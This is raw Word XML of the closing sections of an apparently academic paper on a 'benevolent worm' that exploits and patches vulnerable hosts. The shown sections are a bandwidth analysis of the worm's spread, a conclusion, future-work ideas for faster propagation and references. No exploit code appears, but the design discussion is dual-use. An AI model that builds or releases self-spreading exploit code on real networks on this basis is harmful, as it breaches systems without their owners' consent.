      <w:tr w:rsidR="00CA0CD3" w:rsidRPr="00861880"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192.168.0.186</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20:51:20,765</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192.168.0.187</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N/A - 187 was end</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14BF0">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rPr>
              <w:t>2,404</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00B63226">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00E95071"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One noticeable trend is that when a hop exploits the first target in its list the number of bytes sent is less than from the previous (first exploit successful) hop.  An example is seen in the hops from 160-&gt;161-&gt;162.  The worm sends 2,404 bytes for the initial exploit, followed by 6,550 bytes for the remote loader code.  It then sends the worm binary (1,496,552), OS patch binary (1,291,040 bytes), and updated options file with targets.  Included are some bytes for commands to the remote loader server run on each exploited system.  In the case of 161-&gt;162 w</w:t>
      </w:r>
      <w:r w:rsidR="001F7C7C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e note that 15 bytes less were s</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ent compared to 160-&gt;161.  This corresponds to a target IP address line being removed from the options file for the next hop.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00086C2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At hops where multiple targets were attempted unsuccessfully (the worm will only have at most 1 successful attempt at any particular hop) the number of bytes sent can actually increase </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>compared to the last time.  This is simply due to the attempt to send the exploit (2,404</w:t>
      </w:r>
      <w:r w:rsidR="00ED4CBC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> bytes</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>) to each target unsuccessfully.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB011D"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Since the worm </w:t>
      </w:r>
      <w:r w:rsidR="00F363FF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>operates</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> sequentially (hop to hop) the most bytes sent</w:t>
      </w:r>
      <w:r w:rsidR="00FE4538">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> on the network</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> at any one instances for this iteration was </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2,811,634 (excluding small overhead for TCP headers and IP headers) which was transmitted in under 1 second.  On a network with a 100mbps switch infrastructure this would have consumed approximately 22.5% of the available bandwidth between two nodes only.  Since the transmission required less than 1 second no significant impact would be imposed on the network.  Had the hop been across a slower line such as a 10mbps switch it would have taken ~2.25 secon</w:t>
      </w:r>
      <w:r w:rsidR="00C005FD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ds for the hop to send the data.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="006A170E" w:rsidP="00B63226">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ab/>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>If there had been 254 targets (a common /24 sized sub-network size) with each one exploitable and assuming that each hop started immediately after the other finished sending the first hop would send approximately 2,800,799 bytes (254 targets in options file + exploit and binary sizes) and the last hop would send 2,797,004 bytes which would</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> take</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> about 2.23 - 2.24 seconds to send at each hop on a 10mbps </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>unswitched</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> network with the network spending a total of </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>566.72 seconds of transmitting traffic assuming only the worm was generating network traffic and nothing else.  On such a network this could cause the network to become tied up for minutes while the worm spread.  However, such a network may already be considered slow especially if it is trying to support 254 nodes.  It is much more reasonable to assume that such a large network will have a 100mbps switched network which would result in the worm spreading from hop to hop in less than 1 second as well as not affecting the entire network’s backplane bandwidth but only from 1 node to the next.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00D22C6A"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B26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>If the network were such that the worm had been hoping across WAN or other long distance lower bandwidth links (</w:t>
      </w:r>
      <w:r w:rsidR="008756D0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>suppose each target was connected</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> across the country wit</w:t>
      </w:r>
      <w:r w:rsidR="008756D0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>h 1.5mbps lines) then the worm c</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ould possibly tie up the network line for even </w:t>
      </w:r>
      <w:r w:rsidR="008756D0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>longer</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, but this still amounts to a matter of seconds and not minutes</w:t>
      </w:r>
      <w:r w:rsidR="008756D0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> with a linear hop-to-hop strategy</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.  Possible solutions include writing the worm itself in a language that also generates smaller binaries (the worm binary itself being fairly large</w:t>
      </w:r>
      <w:r w:rsidR="008756D0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> for this limited bandwidth</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>) at the disadvantage of ease of code or having the worm only spread when the network appears to have been idle for some amount of time.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00695A08">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="39" w:name="_Toc321736804"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Conclusion</w:t>
      </w:r>
      <w:bookmarkEnd w:id="39"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00224144"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The question of whether</w:t>
      </w:r>
      <w:r w:rsidR="009855FD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> it is feasible to use</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a benevolent worm </w:t>
      </w:r>
      <w:r w:rsidR="009855FD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to patch vulnerable systems has been answered in the affirmative</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">.  A framework for how such a benevolent worm should be designed and behave has been explored in this research.  A responsible worm has been determined to be one that </w:t>
      </w:r>
      <w:r w:rsidR="009855FD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">mitigates risks of resource abuse or system </w:t>
      </w:r>
      <w:r w:rsidR="00056594">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>interruption</w:t>
      </w:r>
      <w:r w:rsidR="009855FD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (crashing) by the use of careful automated controls as well as allowing for human intervention and control.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="001630B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A benevolent worm still has risks the most prevalent of which is crashing a system due to unexpected memory address exceptions.  </w:t>
      </w:r>
      <w:r w:rsidR="00056594">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The importance of audibility to provide insight into what the worm did as well as the capability to undo what it did are additional factors that help to reduce this risk to a level that will allow the benefits to outweigh the risks.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="001630B7"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B26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">By utilizing a well defined framework as given in this paper the risks of a benevolent worm versus the benefit of protecting a network from malicious worms is justifiable and feasible.  While </w:t>
      </w:r>
      <w:r w:rsidR="00091B60">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">no framework may be 100% </w:t>
      </w:r>
      <w:r w:rsidR="00D143D1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>perfect</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and even with unintended side-effects a benevolent worm will still assist in flushing out vulnerable systems and bring attention to them </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>so that malicious worms will have a reduced opportunity of using vulnerable systems for nefarious purposes.  For those systems that the benevolent worm patches without incident vulnerable systems on the Internet or internal networks that could have been exploited by a malicious worm will become more secure.  This benefits society as a whole by providing next generation methods of protection and assists in preventing neglected or unpatched systems, either due to ignorance of the user or tardiness in securing systems, from being used against users of the network as a whole.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00695A08">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="40" w:name="_Toc321736805"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Future Work</w:t>
      </w:r>
      <w:bookmarkEnd w:id="40"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRDefault="00273819"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method of providing authenticity for the worm's log would be very helpful.  A framework for rapidly developing and implementing validation tests would assist in keeping ahead of malicious worms that might try to subvert the controls.  The difficulty in using keys to sign logs is caused by the fact that the remote systems are not under any direct control of a central authority.  The benevolent worm has to deal with systems that are possibly already under the control of a malicious entity creating an arms race for retaining control.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRDefault="00273819"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B74E5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">The redundancy of a worm for spreading itself and handling mobile users or disconnects needs further exploration.  Peer-to-peer methods seem to provide the most promise in terms of avoiding bottlenecks of central control.  Hybrid approaches such as division of responsibility also provide useful techniques as seen in the Storm worm </w:t>
      </w:r>
      <w:r w:rsidR="00802502">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>analyzed in the "Profiles of computer worms" section</w:t>
      </w:r>
      <w:r w:rsidR="002B74E5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="001107EB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  The network graph would also be useful in assisting the spread of the worm to reach other hosts, but the overhead of forming such would have to be considered.  Techniques such as </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>distance vector</w:t>
      </w:r>
      <w:r w:rsidR="001107EB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> routing and</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> link state </w:t>
      </w:r>
      <w:r w:rsidR="001107EB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>could be useful.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00671C8B" w:rsidRDefault="00671C8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w:t>
      </w:r>
      <w:r w:rsidRPr="00671C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strictly linear approach to spreading the worm may prove to be too slow to be useful in patching systems before they are exploited by malicious persons or even after.  One approach discussed was a fan-out method so that on a local network the worm is more aggressive and uses an exponential fan-out while for non-local targets it uses a fan-in approach to conserver bandwidth.  This area strongly falls into efficient distributed networks and research involving dynamic topology detection as well as simulations of large scale traffic would be greatly useful.</w:t>
      </w:r>
      <w:r w:rsidR="00E44797">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  Data on the best number of concurrent worms executing in a network as well as appropriate scaling to avoid congestion would provide important worm configuration settings and distribution methods.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00671C8B" w:rsidRDefault="00671C8B"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D4284">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>UI research on the best way to notify users of a vulnerable system whether on the end-point node itself or to a network administrator is important.  An individual or organization would need a way to quickly know if a worm was spreading on their network, the source of the worm, and how to stop it.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00316F10" w:rsidRPr="00671C8B" w:rsidRDefault="00316F10" w:rsidP="00B63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A3DC2">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Testing of the benevolent worm in this research was limited due to available equipment and resources.  A much larger scale test or simulation of an environment of vulnerable systems with a dynamic configuration of networks would provide great insight into the best methods of deploying the worm as well as controls that could stop the entire worm across a large network.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003D2C00" w:rsidRPr="00861880" w:rsidRDefault="00671C8B" w:rsidP="00B63226">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3D2C00" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="003D2C00" w:rsidP="00695A08">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="41" w:name="_Toc321736806"/>
      <w:r w:rsidRPr="00861880">
        <w:lastRenderedPageBreak/>
        <w:t>References</w:t>
      </w:r>
      <w:bookmarkEnd w:id="41"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00AB4E04">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Aycock</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, John and Alana </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Maurushat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “Good Worms and Human Rights.” Oct. 2006. Accessed: 15 Oct. 2011. &lt;http://pages.cpsc.ucalgary.ca/~aycock/papers/china.pdf&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00AB4E04">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Bita</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, Natasha. “Call to banish virus-hit computers from internet.” The Australian: 25 Jan. 2010 . Accessed: 6 Feb</w:t>
      </w:r>
      <w:r w:rsidR="00FE59A0">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&lt;http://www.theaustralian.com.au/news/call-to-cut-net-link-on-virus-hit-computers/story-e6frg6n6-1225823060022&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00EC68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Broad, William J., John </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Markoff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, and David E. Sanger. “Israeli Test on Worm Called Crucial in Iran Nuclear Delay.” The New York Times: 15 Jan. 2011. Accessed: 23 Jan. 2012. &lt;http://www.nytimes.com/2011/01/16/world/middleeast/16stuxnet.html?_r=1&amp;pagewanted=print&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00EC68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Cloud Security Alliance. “Top Threats to Cloud Computing V1.0.” CSA: Mar. 2010. Accessed: 1 Nov. 2011. &lt;http://www.cloudsecurityalliance.org/topthreats/csathreats.v1.0.pdf&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00EC68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Denning, Peter J. “The Internet Worm.” RIACS Technical Report TR-89.3. Research Institute of Advanced Computer Science: 7 Feb. 1989. Accessed: 23 Jan. 2012. &lt;http://ntrs.nasa.gov/archive/nasa/casi.ntrs.nasa.gov/19900014594_1990014594.pdf&gt;</w:t>
      </w:r>
    </w:p>
